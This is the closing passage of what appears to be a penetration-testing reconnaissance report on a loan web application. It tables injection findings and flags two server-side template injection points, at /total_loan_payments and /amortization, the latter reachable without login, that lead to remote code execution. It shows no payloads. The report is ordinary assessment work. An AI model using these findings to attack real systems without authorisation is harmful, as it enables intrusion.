|------|-------|---------------------|-------------------|
| **Direct Command Injection** | 0 | N/A | N/A |
| **SQL Injection** | 0 | N/A | N/A |
| **SSTI (leads to RCE)** | 2 | `/total_loan_payments` (authenticated), `/amortization` (unauthenticated) | YES |

**Critical Findings:**
1. **Zero direct command or SQL injection vulnerabilities**
2. **Two SSTI vulnerabilities** enabling indirect command execution
3. **Most critical:** `/amortization` SSTI is **publicly accessible** without authentication
4. **SQLAlchemy ORM provides robust SQL injection protection** (positive security control)

---

**END OF RECONNAISSANCE DELIVERABLE**